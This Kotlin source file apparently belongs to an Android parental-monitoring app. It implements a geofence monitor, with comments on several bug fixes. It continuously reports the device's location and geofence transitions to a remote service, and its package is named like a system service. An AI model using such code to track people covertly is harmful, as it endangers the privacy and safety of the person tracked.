package com.system.service.monitors

import android.content.Context
import android.location.Location
import com.google.android.gms.location.*
import com.system.service.core.CoreService
import org.json.JSONObject

object GeofenceMonitor {

    private var centerLat = 0.0
    private var centerLng = 0.0
    private var radiusM   = 200f
    private var enabled   = false

    // BUG FIX: wasInside defaulted to `true`, so a child already OUTSIDE the geofence
    // when it was set would never trigger an alert (no state transition detected).
    // Using null means "unknown" — first location always checks and sends correct state.
    private var wasInside: Boolean? = null

    private var fusedClient: FusedLocationProviderClient? = null
    private var locationCallback: LocationCallback? = null

    fun setGeofence(lat: Double, lng: Double, radius: Float, context: Context) {
        centerLat = lat; centerLng = lng; radiusM = radius; enabled = true
        // BUG FIX: Calling setGeofence() multiple times registered multiple callbacks
        // because locationCallback was overwritten without removing the old one.
        // Now always stop first, then start fresh.
        stopTracking()
        wasInside = null    // reset state so first fix triggers an alert if outside
        startTracking(context)
    }

    fun disableGeofence() { enabled = false; stopTracking() }

    fun startTracking(context: Context) {
        fusedClient = LocationServices.getFusedLocationProviderClient(context)
        val req = LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, 30_000L)
            .setMinUpdateDistanceMeters(20f).build()
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let { checkGeofence(it) }
            }
        }
        try {
            // BUG FIX: locationCallback!! can NPE if stopTracking() races with startTracking().
            // Capture into local val first; return early if already stopped.
            val cb = locationCallback ?: return
            fusedClient?.requestLocationUpdates(req, cb, android.os.Looper.getMainLooper())
        } catch (_: SecurityException) {}
    }

    fun stopTracking() {
        locationCallback?.let { fusedClient?.removeLocationUpdates(it) }
        locationCallback = null   // BUG FIX: null out so stopTracking() is idempotent
    }

    private fun checkGeofence(loc: Location) {
        if (!enabled) return
        val center = Location("").apply { latitude = centerLat; longitude = centerLng }
        val dist     = loc.distanceTo(center)
        val isInside = dist <= radiusM

        // Send alert on transition OR on first fix (wasInside == null)
        if (isInside != wasInside) {
            wasInside = isInside
            CoreService.instance?.sendData("geofence_alert", JSONObject().apply {
                put("inside",   isInside)
                put("lat",      loc.latitude)
                put("lng",      loc.longitude)
                put("dist_m",   dist.toInt())
                put("radius_m", radiusM.toInt())
            })
        }
        CoreService.instance?.sendData("location", JSONObject().apply {
            put("lat",             loc.latitude)
            put("lng",             loc.longitude)
            put("accuracy",        loc.accuracy)
            put("geofence_inside", isInside)
        })
    }
}
